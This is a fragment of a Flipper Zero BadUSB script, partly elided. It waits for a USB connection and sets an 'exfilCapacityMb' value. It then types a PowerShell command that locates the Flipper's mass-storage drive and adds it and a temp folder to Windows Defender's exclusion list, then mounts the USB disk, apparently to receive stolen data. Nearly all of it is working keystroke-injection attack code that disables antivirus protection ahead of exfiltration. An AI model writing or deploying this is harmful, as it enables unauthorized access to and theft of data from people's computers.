...
let exfilCapacityMb = 15; // adjust if payload is > 4MB
...
while (!badusb.isConnected()) {delay(5000);}
...
badusb.print("do { Start-Sleep 3; $DiskN = Get-Disk | Select-Object -Property Number,FriendlyName | Where-Object -FilterScript { ($_.FriendlyName) -eq \"Flipper Mass Storage\"} | Select-Object -ExpandProperty Number; } while ($DiskN -lt 0); $DiskL = (Get-Partition -DiskN ${DiskN} | Select-Object -ExpandProperty DriveLetter) -join '';$drivePath = $DiskL + ':';Add-MpPreference -ExclusionPath $drivePath;Add-MpPreference -ExclusionPath " + localTempFolder + "");
badusb.press("ENTER");
print("> mount usbdisk");
delay(1000);
